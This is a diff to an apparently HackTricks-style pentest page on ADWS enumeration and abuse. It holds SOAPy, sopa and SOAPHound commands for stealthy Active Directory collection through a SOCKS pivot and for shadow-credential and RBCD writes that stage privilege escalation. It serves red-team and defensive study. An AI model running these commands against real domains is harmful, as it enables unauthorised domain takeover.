@@ -26,8 +26,8 @@ ADWS interactions are implemented over WS-Enumeration: every query starts with a
 
 * Supports **proxying through SOCKS** (useful from C2 implants).
 * Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
-* Optional **write** operations ( `--set` / `--delete` ).
-* **BOFHound output mode** for direct ingestion into BloodHound.<sup>[[3]](#references)</sup>
+* Targeted **write** operations for RBCD, SPNs, account flags and key credentials.<sup>[[2]](#references)</sup>
+* SOAPy output can be parsed by **BOFHound** and imported into BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
 * `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.<sup>[[2]](#references)</sup>
 
 ### Targeted collection flags & write operations
@@ -37,16 +37,39 @@ SoaPy ships with curated switches that replicate the most common LDAP hunting ta
 Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
 
 ```bash
-soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
+SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
       --spns -f samAccountName,servicePrincipalName --parse
 ```
 
-Use the same host/credentials to immediately weaponise findings: dump RBCD-capable objects with `--rbcds`, then apply `--rbcd 'WEBSRV01$' --account 'FILE01$'` to stage a Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).
+Use the same host/credentials to immediately weaponise findings: dump objects already configured for RBCD with `--rbcds`, then apply `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` to stage a Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).<sup>[[2]](#references)</sup>
 
 ### Installation (operator host)
 
+Install the current SOAPy CLI from its upstream repository; the executable name is case-sensitive on Unix-like systems.<sup>[[2]](#references)[[9]](#references)</sup>
+
 ```bash
-python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
+pipx install git+https://github.com/logangoins/SOAPy
+```
+
+### Ticket-only collection through a SOCKS pivot
+
+If a foothold provides a Kerberos ticket but no plaintext password, convert a `.kirbi` ticket to a `ccache` as described in [Pass the Ticket](pass-the-ticket.md), then point SOAPy at that cache. A ticket for the DC's LDAP service can be used in the documented SOAPy ADWS workflow; route both ADWS and Kerberos traffic through the pivot.<sup>[[9]](#references)</sup>
+
+```bash
+KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
+  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
+```
+
+### Shadow credentials over ADWS
+
+If the current principal can write a target object's `msDS-KeyCredentialLink`, SOAPy can add a key credential through ADWS and export the corresponding PFX. Record the returned DeviceID for precise removal instead of clearing the entire attribute. Use the PFX for PKINIT as explained in [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>
+
+```bash
+SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
+  --shadow-creds add --shadow-target targetuser
+# After use, remove only the DeviceID returned by the add action:
+SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
+  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
 ```
 
 ## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)
@@ -116,7 +139,7 @@ Operationally, prefer a DC-controlled resolver to avoid failures in segmented en
 
 * Use `--dns <DC-IP>` so **all** SRV/PTR/forward lookups go through the DC DNS.
 * Use `--dns-tcp` when UDP is blocked or SRV answers are large.
-* If Kerberos is enabled and `--dc` is an IP, sopa performs a **reverse PTR** to obtain an FQDN for correct SPN/KDC targeting. If Kerberos is not used, no PTR lookup happens.
+* If `--dc` is an IP, sopa always performs a **reverse PTR** lookup: the ADWS `wsa:To` address filter requires an FQDN even without Kerberos. Supply a DC FQDN directly if the reverse zone is missing.<sup>[[5]](#references)</sup>
 
 Example (IP + Kerberos, forced DNS via the DC):
 
@@ -157,9 +180,7 @@ Typical workflow on a domain-joined operator VM:
 SOAPHound.exe --buildcache -c C:\temp\corp-cache.json
 
 # BloodHound collection in autosplit mode, skipping LAPS noise
-SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
-              --autosplit --threshold 1200 --nolaps \
-              -o C:\temp\BH-output
+SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output
 
 # ADCS & DNS enrichment for ESC chains
 SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
@@ -172,12 +193,12 @@ Exported JSON slots directly into SharpHound/BloodHound workflows—see [BloodHo
 
 The following workflow shows how to enumerate **domain & ADCS objects** over ADWS, convert them to BloodHound JSON and hunt for certificate-based attack paths – all from Linux:
 
-1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.
+1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Route the raw TCP client through SOCKS with `proxychains4 SOAPy ...` (configure the SOCKS5 address in `proxychains4.conf`); `HTTPS_PROXY` does not proxy this non-HTTP protocol.<sup>[[9]](#references)</sup>
 
 2. **Collect the root domain object:**
 
 ```bash
-soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
+proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
       -q '(objectClass=domain)' \
       | tee data/domain.log
 ```
@@ -185,10 +206,9 @@ soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
 3. **Collect ADCS-related objects from the Configuration NC:**
 
 ```bash
-soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
+proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
       -dn 'CN=Configuration,DC=ludus,DC=domain' \
-      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
-           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
+      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
       | tee data/adcs.log
 ```
 
@@ -202,13 +222,14 @@ bofhound -i data --zip   # produces BloodHound.zip
 
 ### Writing `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
 
+With write access to the target computer object, use SOAPy's RBCD action rather than a raw security-descriptor string. Here `WEBSRV01$` is the controlled source and `FILE01$` is the target whose attribute changes.<sup>[[2]](#references)</sup>
+
 ```bash
-soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
-      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
-      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
+SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
+      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
 ```
 
-Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).
+Continue the Kerberos S4U chain in [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).
 
 ## Tooling Summary
 
@@ -220,6 +241,8 @@ Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Co
 | Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
 | ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |
 
+
+
 ## References
 
 - [1] [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
@@ -230,5 +253,6 @@ Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Co
 - [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
 - [7] [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
 - [8] [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
-
+- [9] [SOAPy Wiki – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
+- [10] [SOAPy Wiki – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
 {{#include ../../banners/hacktricks-training.md}}
